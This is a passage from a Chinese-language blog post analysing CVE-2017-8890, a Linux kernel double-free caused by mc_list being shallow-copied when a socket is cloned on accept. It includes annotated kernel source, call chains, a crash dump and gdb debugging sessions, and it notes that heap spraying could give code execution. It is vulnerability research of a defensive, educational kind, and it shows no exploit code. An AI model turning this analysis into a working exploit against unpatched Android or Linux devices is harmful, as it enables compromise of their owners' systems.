<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2017-8890 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2017-8890</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2017/09/20</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Android_Kernel"> Android_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2017-8890"><a href="#CVE-2017-8890" class="headerlink" title="CVE-2017-8890"></a>CVE-2017-8890</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>理论上Linux Kernel 2.5.69~Linux Kernel 4.11</p>
<h3 id="测试内核"><a href="#测试内核" class="headerlink" title="测试内核"></a>测试内核</h3><p>Linux version 3.4.67-gd3ffcc7-dirty (ubuntu@ubuntu) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #4 PREEMPT Mon Sep 11 09:06:06 CST 2017(32位)<br>PS：因为没找到合适的64位goldfish源码，所以直接使用的32位进行调试，64位原理是一致的</p>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞属于一个Doubel Free漏洞,Linux内核中net/ipv4/inet_connection_sock.c中的inet_csk_clone_lock函数中存在浅拷贝问题,当我们调用accept函数时,会调用底层函数inet_csk_clone函数。若有客户端连接到该服务端,会用到accept函数中参数1和返回值,底层函数inet_csk_clone会将accept函数的参数1(parent_sockfd)所对应的sk变量拷贝到accept函数返回值(child_sockfd)所对应的sk变量中,但并没有清空child_sockfd所对应的sk-&gt;mc_list的值,当使用close函数对这两个句柄进行关闭时,会对sk结构中的iml进行两次释放,通过堆喷射可执行任意代码。</p>
<h3 id="Google修复链接"><a href="#Google修复链接" class="headerlink" title="Google修复链接"></a>Google修复链接</h3><p><a href="https://android.googlesource.com/kernel/goldfish/+/88c573e1342ea5734088052879987c0e8f9bf10c%5E%21/#F0" target="_blank" rel="external">https://android.googlesource.com/kernel/goldfish/+/88c573e1342ea5734088052879987c0e8f9bf10c%5E%21/#F0</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>PC is at 0xeeeeeeea
LR is at __rcu_process_callbacks+0x8c/0xa4
pc : [&lt;eeeeeeea&gt;]    lr : [&lt;c0069f78&gt;]    psr: a0000133
sp : c611de88  ip : c6d2dd98  fp : 0000000a
r10: 00000009  r9 : d400e810  r8 : c9635ec8
r7 : 00000101  r6 : b6efb008  r5 : 00000fff  r4 : c6d2dd98
r3 : eeeeeeee  r2 : 00000000  r1 : 00000101  r0 : b6efb008
</code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h3><ol>
<li>对象何时何处被分配<ul>
<li>内存分配链：sys_setsockopt( ) -&gt; sock_common_setsockopt( ) -&gt; tcp_setsockopt( ) -&gt; ip_setsockopt( ) -&gt; do_ip_setsockopt( ) -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […]</li>
</ul>
</li>
<li>对象何时何处存在浅拷贝<ul>
<li>浅拷贝链：tcp_v4_syn_recv_sock -&gt; tcp_create_openreq_child -&gt; inet_csk_clone_lock( ) -&gt; sk_clone_lock( ) -&gt; sock_copy( ) -&gt; […]</li>
</ul>
</li>
<li>对象何时何处被二次使用<ul>
<li>释放调用链:sys_close( ) -&gt; filp_close( ) -&gt; fput( ) -&gt; __fput( ) -&gt; sock_close( ) -&gt; sock_release( ) -&gt; inet_release( ) -&gt; ip_mc_drop_socket( ) -&gt; […]</li>
</ul>
</li>
</ol>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>首先我们看android对该漏洞做的补丁，只是简单的对newsk结构体指针指向的mc_list成员做了下初始化，并没有多余的修补代码，那么我们详细看下newsk是怎么来的，可以看到来源于sk_clone_lock( )函数的返回值，我们直接到sk_clone_lock函数中看看<br>  浅拷贝链：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">struct</span> sock *<span class="title">inet_csk_clone_lock</span><span class="params">(<span class="keyword">const</span> <span class="keyword">struct</span> sock *sk,                            <span class="comment">/*克隆一个传输控制块，并对新的传输控制块上锁*/</span></span></span></div><div class="line">                 <span class="keyword">const</span> <span class="keyword">struct</span> request_sock *req,</div><div class="line">                 <span class="keyword">const</span> <span class="keyword">gfp_t</span> priority)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> sock *newsk = sk_clone_lock(sk, priority);                    <span class="comment">/*从缓冲中分配一个sock，并克隆sk*/</span></div><div class="line">    <span class="keyword">if</span> (newsk) &#123;</div><div class="line">        <span class="keyword">struct</span> inet_connection_sock *newicsk = inet_csk(newsk);</div><div class="line">        newsk-&gt;sk_state = TCP_SYN_RECV;                                  <span class="comment">/*设置新sock的状态为TCP_SYN_RECV*/</span></div><div class="line">        newicsk-&gt;icsk_bind_hash = <span class="literal">NULL</span>;</div><div class="line">        inet_sk(newsk)-&gt;inet_dport = inet_rsk(req)-&gt;ir_rmt_port;         <span class="comment">/*设置新sock的目的端口*/</span></div><div class="line">        inet_sk(newsk)-&gt;inet_num = inet_rsk(req)-&gt;ir_num;</div><div class="line">        inet_sk(newsk)-&gt;inet_sport = htons(inet_rsk(req)-&gt;ir_num);       <span class="comment">/*设置新sock的源端口*/</span></div><div class="line">        newsk-&gt;sk_write_space = sk_stream_write_space;</div><div class="line">        <span class="comment">/* listeners have SOCK_RCU_FREE, not the children */</span></div><div class="line">        sock_reset_flag(newsk, SOCK_RCU_FREE);</div><div class="line">        inet_sk(newsk)-&gt;mc_list = <span class="literal">NULL</span>;                                  <span class="comment">/*补丁位置  添加了一行对mc_list的初始化*/</span></div><div class="line">        newsk-&gt;sk_mark = inet_rsk(req)-&gt;ir_mark;</div><div class="line">        atomic64_set(&amp;newsk-&gt;sk_cookie,</div><div class="line">                 atomic64_read(&amp;inet_rsk(req)-&gt;ir_cookie));</div><div class="line">        newicsk-&gt;icsk_retransmits = <span class="number">0</span>;</div><div class="line">        newicsk-&gt;icsk_backoff      = <span class="number">0</span>;</div><div class="line">        newicsk-&gt;icsk_probes_out  = <span class="number">0</span>;</div><div class="line">        <span class="comment">/* Deinitialize accept_queue to trap illegal accesses. */</span></div><div class="line">        <span class="built_in">memset</span>(&amp;newicsk-&gt;icsk_accept_queue, <span class="number">0</span>, <span class="keyword">sizeof</span>(newicsk-&gt;icsk_accept_queue));</div><div class="line">        security_inet_csk_clone(newsk, req);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> newsk;                                                        <span class="comment">/*返回新sock的内存地址*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>根据内核源码注释可知sk_clone_lock用于拷贝一个socket，这里先申请一块内存，然后把传入的sk数据拷贝到新申请的内存中，并对新的sk结构体做一些初始化<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">*    sk_clone_lock - clone a socket, and lock its clone</div><div class="line">*    @sk: the socket to clone</div><div class="line">*    @priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)</div><div class="line">*</div><div class="line">*    Caller must unlock socket even in error path (bh_unlock_sock(newsk))</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">struct</span> sock *<span class="title">sk_clone_lock</span><span class="params">(<span class="keyword">const</span> <span class="keyword">struct</span> sock *sk, <span class="keyword">const</span> <span class="keyword">gfp_t</span> priority)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> sock *newsk;</div><div class="line">    <span class="keyword">bool</span> is_charged = <span class="literal">true</span>;</div><div class="line">    newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family);            <span class="comment">/*新sock内存申请函数*/</span></div><div class="line">    <span class="keyword">if</span> (newsk != <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="keyword">struct</span> sk_filter *filter;</div><div class="line">        sock_copy(newsk, sk);                                               <span class="comment">/*浅拷贝函数*/</span></div><div class="line">        <span class="comment">/* SANITY */</span></div><div class="line">        get_net(sock_net(newsk));</div><div class="line">           [...]</div><div class="line">        skb_queue_head_init(&amp;newsk-&gt;sk_error_queue);</div><div class="line">        filter = rcu_dereference_protected(newsk-&gt;sk_filter, <span class="number">1</span>);</div><div class="line">        <span class="keyword">if</span> (filter != <span class="literal">NULL</span>)</div><div class="line">           [...]</div><div class="line">        <span class="keyword">if</span> (unlikely(!is_charged || xfrm_sk_clone_policy(newsk))) &#123;</div><div class="line">           [...]</div><div class="line">            <span class="keyword">goto</span> out;</div><div class="line">        &#125;</div><div class="line">        newsk-&gt;sk_err       = <span class="number">0</span>;</div><div class="line">        newsk-&gt;sk_priority = <span class="number">0</span>;</div><div class="line">        <span class="comment">/*</span></div><div class="line">         * Before updating sk_refcnt, we must commit prior changes to memory</div><div class="line">         * (Documentation/RCU/rculist_nulls.txt for details)</div><div class="line">         */</div><div class="line">        smp_wmb();</div><div class="line">        atomic_set(&amp;newsk-&gt;sk_refcnt, <span class="number">2</span>);</div><div class="line">           [...]</div><div class="line">    &#125;</div><div class="line">out:</div><div class="line">    <span class="keyword">return</span> newsk;                                                              <span class="comment">/*返回前面申请的内存首地址,用做newsk*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">* Copy all fields from osk to nsk but nsk-&gt;sk_refcnt must not change yet,</div><div class="line">* even temporarly, because of RCU lookups. sk_node should also be left as is.</div><div class="line">* We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end</div><div class="line">*/</div><div class="line"><span class="comment">/*这里的osk就是accept第一个参数socketfd对应的parent_socket，nsk就是accept函数返回的socketfd对应的child_sockfd*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sock_copy</span><span class="params">(<span class="keyword">struct</span> sock *nsk, <span class="keyword">const</span> <span class="keyword">struct</span> sock *osk)</span></span></div><div class="line">&#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></div><div class="line">    <span class="keyword">void</span> *sptr = nsk-&gt;sk_security;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>                                                                          <span class="comment">/*存在浅拷贝的位置*/</span></span></div><div class="line">    <span class="built_in">memcpy</span>(nsk, osk, offsetof(<span class="keyword">struct</span> sock, sk_dontcopy_begin));</div><div class="line">    <span class="built_in">memcpy</span>(&amp;nsk-&gt;sk_dontcopy_end, &amp;osk-&gt;sk_dontcopy_end,</div><div class="line">           osk-&gt;sk_prot-&gt;obj_size - offsetof(<span class="keyword">struct</span> sock, sk_dontcopy_end));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></div><div class="line">    nsk-&gt;sk_security = sptr;</div><div class="line">    security_sk_clone(osk, nsk);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面标记拷贝处就是漏洞的成因，<code>因为内核中直接通过memcpy克隆了一个socket，并且未对克隆后的socket中的mc_list结构体变量做初始化，导致了浅拷贝问题，也就是两个socket中存在一个变量同时指向同一块mc_list内存，如果其中一个socket被关闭那么该内存就会被释放，而另一个socket却还残留着这块内存的引用指针，这样就导致uaf漏洞或者doublefree漏洞</code>。</p>
<p>那么该对象是何时何处被申请的呢?<br><strong>内存分配链：sys_setsockopt() -&gt; sock_common_setsockopt() -&gt; tcp_setsockopt() -&gt; ip_setsockopt() -&gt; do_ip_setsockopt() -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […]</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">int</span> level,</span></span></div><div class="line">       <span class="keyword">int</span> optname, <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)&#123;</div><div class="line">    <span class="keyword">int</span> err;</div><div class="line">    <span class="keyword">if</span> (level != SOL_IP)</div><div class="line">       <span class="keyword">return</span> -ENOPROTOOPT;</div><div class="line">    err = do_ip_setsockopt(sk, level, optname, optval, optlen);</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NETFILTER</span></div><div class="line">    [……]</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">return</span> err;</div><div class="line">&#125;EXPORT_SYMBOL(ip_setsockopt);</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">int</span> level,</span></span></div><div class="line">               <span class="keyword">int</span> optname, <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)&#123;</div><div class="line">    <span class="keyword">struct</span> inet_sock *inet = inet_sk(sk);</div><div class="line">    <span class="keyword">int</span> val = <span class="number">0</span>, err;</div><div class="line">    <span class="keyword">switch</span> (optname) &#123;</div><div class="line">    <span class="keyword">case</span> IP_PKTINFO:</div><div class="line">    <span class="keyword">case</span> IP_RECVTTL:</div><div class="line">    <span class="keyword">case</span> IP_RECVOPTS:</div><div class="line">[…]</div><div class="line"><span class="keyword">case</span> MCAST_JOIN_GROUP:</div><div class="line"><span class="keyword">case</span> MCAST_LEAVE_GROUP:</div><div class="line">&#123;</div><div class="line">   <span class="keyword">struct</span> group_req greq;</div><div class="line">   <span class="keyword">struct</span> sockaddr_in *psin;</div><div class="line">   <span class="keyword">struct</span> ip_mreqn mreq;</div><div class="line">   <span class="keyword">if</span> (optlen &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> group_req))</div><div class="line">       <span class="keyword">goto</span> e_inval;</div><div class="line">   err = -EFAULT;</div><div class="line">   <span class="keyword">if</span> (copy_from_user(&amp;greq, optval, <span class="keyword">sizeof</span>(greq)))</div><div class="line">       <span class="keyword">break</span>;</div><div class="line">   psin = (<span class="keyword">struct</span> sockaddr_in *)&amp;greq.gr_group;</div><div class="line">   <span class="keyword">if</span> (psin-&gt;sin_family != AF_INET)</div><div class="line">          <span class="keyword">goto</span> e_inval;</div><div class="line">   <span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</div><div class="line">   mreq.imr_multiaddr = psin-&gt;sin_addr;</div><div class="line">   mreq.imr_ifindex = greq.gr_interface;</div><div class="line">   <span class="keyword">if</span> (optname == MCAST_JOIN_GROUP)</div><div class="line">       err = ip_mc_join_group(sk, &amp;mreq);</div><div class="line">   <span class="keyword">else</span></div><div class="line">       err = ip_mc_leave_group(sk, &amp;mreq);</div><div class="line">   <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">[…]</div><div class="line">    release_sock(sk);</div><div class="line">    <span class="keyword">return</span> err;</div><div class="line">e_inval:</div><div class="line">    release_sock(sk);</div><div class="line">    <span class="keyword">return</span> -EINVAL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ip_mc_join_group</span><span class="params">(<span class="keyword">struct</span> sock *sk , <span class="keyword">struct</span> ip_mreqn *imr)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> err;</div><div class="line">    __be32 addr = imr-&gt;imr_multiaddr.s_addr;</div><div class="line">    [……]</div><div class="line">    <span class="keyword">if</span> (count &gt;= sysctl_igmp_max_memberships)</div><div class="line">       <span class="keyword">goto</span> done;</div><div class="line">    iml = sock_kmalloc(sk, <span class="keyword">sizeof</span>(*iml), GFP_KERNEL);  			<span class="comment">/* 申请内存 */</span></div><div class="line">    <span class="keyword">if</span> (iml == <span class="literal">NULL</span>)</div><div class="line">       <span class="keyword">goto</span> done;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;iml-&gt;multi, imr, <span class="keyword">sizeof</span>(*imr));</div><div class="line">    iml-&gt;next_rcu = inet-&gt;mc_list;</div><div class="line">    iml-&gt;sflist = <span class="literal">NULL</span>;</div><div class="line">    iml-&gt;sfmode = MCAST_EXCLUDE;</div><div class="line">    rcu_assign_pointer(inet-&gt;mc_list, iml);</div><div class="line">    ip_mc_inc_group(in_dev, addr);</div><div class="line">    err = <span class="number">0</span>;</div><div class="line">done:</div><div class="line">    rtnl_unlock();</div><div class="line">    <span class="keyword">return</span> err;</div><div class="line">&#125;</div><div class="line">EXPORT_SYMBOL(ip_mc_join_group);</div></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对象何时何处被二次使用?<br><strong>释放调用链:sys_close –&gt; filp_close –&gt; fput –&gt; __fput –&gt; sock_close –&gt; sock_release –&gt; inet_release –&gt; ip_mc_drop_socket</strong></p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>可以通过编译内核，然后使用模拟器 + gdb进行动态调试<br>首先在ip_mc_join_group()函数处下断点,运行poc，程序会在ip_mc_join_group函数处断下,单步调试到执行完sock_kmalloc函数此时应该属于第一个socket创建时申请ip_mc_socklist结构体内存，我们记录申请的内存首地址<code>0xc6d2dd80</code>，接着单步运行，直到该函数结尾处记录其结构体中的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="keyword">break</span> ip_mc_join_group</div><div class="line">Breakpoint <span class="number">1</span> at <span class="number">0xc02ddd8c</span>: file net/ipv4/igmp.c, line <span class="number">1781.</span></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Breakpoint <span class="number">1</span>, ip_mc_join_group (sk=<span class="number">0xd3865240</span>, imr=<span class="number">0xc611de08</span>)</div><div class="line">    at net/ipv4/igmp.c:<span class="number">1781</span></div><div class="line"><span class="number">1781</span>   &#123;</div><div class="line">(gdb) n</div><div class="line"><span class="number">1783</span>       __be32 addr = imr-&gt;imr_multiaddr.s_addr;</div><div class="line"><span class="number">1781</span>   &#123;</div><div class="line">[……]</div><div class="line"><span class="number">1815</span>       iml = sock_kmalloc(sk, <span class="keyword">sizeof</span>(*iml), GFP_KERNEL);</div><div class="line"><span class="number">1816</span>       <span class="keyword">if</span> (iml == <span class="literal">NULL</span>)</div><div class="line"><span class="number">1819</span>       <span class="built_in">memcpy</span>(&amp;iml-&gt;multi, imr, <span class="keyword">sizeof</span>(*imr));</div><div class="line"><span class="number">1820</span>       iml-&gt;next_rcu = inet-&gt;mc_list;</div><div class="line"><span class="number">1821</span>       iml-&gt;sflist = <span class="literal">NULL</span>;</div><div class="line"><span class="number">1822</span>       iml-&gt;sfmode = MCAST_EXCLUDE;</div><div class="line"><span class="number">1820</span>       iml-&gt;next_rcu = inet-&gt;mc_list;</div><div class="line"><span class="number">1823</span>       rcu_assign_pointer(inet-&gt;mc_list, iml);</div><div class="line">(gdb) p iml</div><div class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> ip_mc_socklist *) <span class="number">0xc6d2dd80</span>            <span class="comment">//申请的内存地址</span></div><div class="line">(gdb) p *iml</div><div class="line">$<span class="number">2</span> = &#123;</div><div class="line">  next_rcu = <span class="number">0x0</span>,</div><div class="line">  multi = &#123;</div><div class="line">    imr_multiaddr = &#123;</div><div class="line">      s_addr = <span class="number">16843240</span></div><div class="line">    &#125;,</div><div class="line">    imr_address = &#123;</div><div class="line">      s_addr = <span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    imr_ifindex = <span class="number">2</span></div><div class="line">  &#125;,</div><div class="line">  sfmode = <span class="number">0</span>,</div><div class="line">  sflist = <span class="number">0x0</span>,</div><div class="line">  rcu = &#123;</div><div class="line">    next = <span class="number">0x0</span>,</div><div class="line">    func = <span class="number">0x0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>紧接着在ip_mc_drop_socket()函数处下断点,让程序继续运行，当poc程序第一次调用关闭socket函数close时，程序会在ip_mc_drop_socket函数处断下，此时我们通过p * iml指令查看一下iml成员中的值，可以看到和我们最开始的一致，然后让程序再次跑起来<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="keyword">break</span> ip_mc_drop_socket</div><div class="line">Breakpoint <span class="number">2</span> at <span class="number">0xc02de8c8</span>: file net/ipv4/igmp.c, line <span class="number">2287.</span></div><div 